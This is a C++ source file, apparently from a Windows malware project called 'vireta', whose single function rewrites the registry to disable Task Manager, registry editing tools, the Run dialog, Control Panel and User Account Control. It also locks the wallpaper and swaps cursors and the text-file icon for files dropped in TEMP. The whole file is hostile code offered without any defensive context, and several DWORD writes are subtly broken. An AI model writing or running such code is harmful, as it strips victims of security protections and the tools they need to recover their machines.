
#include <windows.h>
#include <cstdlib>
#include <iostream>

DWORD dword_ok = 1;
DWORD dword_no = 0;
DWORD Resp;
HKEY hKey;

namespace vireta_registry
{
  void write_all() {
    std::string temp = std::string(getenv("TEMP"));
    std::string desktop_path = temp + std::string("\\background.png");
    std::string cursor_path = temp + std::string("\\eye.cur");
    std::string ico_path = temp + std::string("\\icon.ico");

    // Desktop Data
    const char* desktop_data = desktop_path.c_str();
    size_t desktop_size = strlen(desktop_data);
    const char* cursor_data = cursor_path.c_str();
    size_t cursor_size = strlen(cursor_data);
    const char* ico_data = ico_path.c_str();
    size_t ico_size = strlen(ico_data);

    // System ( USER )
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("Wallpaper"), 0, REG_SZ, (LPBYTE)desktop_data, desktop_size);
      RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("Wallpaper"), 0, REG_SZ, (LPBYTE)desktop_data, desktop_size);
      RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("Wallpaper"), 0, REG_SZ, (LPBYTE)desktop_data, desktop_size);
      RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("Wallpaper"), 0, REG_SZ, (LPBYTE)desktop_data, desktop_size);
      RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("DisableRegistryTools"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    }

    // Cursors
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Control Panel\\Cursors"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Control Panel\\Cursors"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("Arrow"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegSetValueEx(hKey, TEXT("Hand"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegSetValueEx(hKey, TEXT("AppStarting"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("Arrow"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegSetValueEx(hKey, TEXT("Hand"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegSetValueEx(hKey, TEXT("AppStarting"), 0, REG_SZ, (LPBYTE)cursor_data, cursor_size);
      RegCloseKey(hKey);
    }

    // System ( MACHINE )
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegCloseKey(hKey);
      if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegCloseKey(hKey);
      }
    }

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("ConsentPromptBehaviorAdmin"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("VerboseStatus"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("EnableLUA"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegSetValueEx(hKey, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegSetValueEx(hKey, TEXT("undockwithoutlogon"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("ConsentPromptBehaviorAdmin"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("VerboseStatus"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("EnableLUA"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegSetValueEx(hKey, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegSetValueEx(hKey, TEXT("undockwithoutlogon"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_no), sizeof(dword_no));
      RegCloseKey(hKey);
    }

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("NoRun"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("NoControlPanel"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("NoRun"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegSetValueEx(hKey, TEXT("NoControlPanel"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    }

    // Active Desktop
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("NoChangingWallPaper"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("NoChangingWallPaper"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT("NoChangingWallPaper"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT("NoChangingWallPaper"), 0, REG_DWORD, reinterpret_cast<BYTE *>(dword_ok), sizeof(dword_ok));
      RegCloseKey(hKey);
    }

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT("txtfile\\DefaultIcon"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CLASSES_ROOT, TEXT("txtfile\\DefaultIcon"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT(""), 0, REG_SZ, (LPBYTE)ico_data, ico_size);
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT(""), 0, REG_SZ, (LPBYTE)ico_data, ico_size);
      RegCloseKey(hKey);
    }

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT("textfile\\DefaultIcon"), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
      RegCloseKey(hKey);
      RegCreateKeyEx(HKEY_CLASSES_ROOT, TEXT("textfile\\DefaultIcon"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
      RegSetValueEx(hKey, TEXT(""), 0, REG_SZ, (LPBYTE)ico_data, ico_size);
      RegCloseKey(hKey);
    } else {
      RegSetValueEx(hKey, TEXT(""), 0, REG_SZ, (LPBYTE)ico_data, ico_size);
      RegCloseKey(hKey);
    }
  };
}
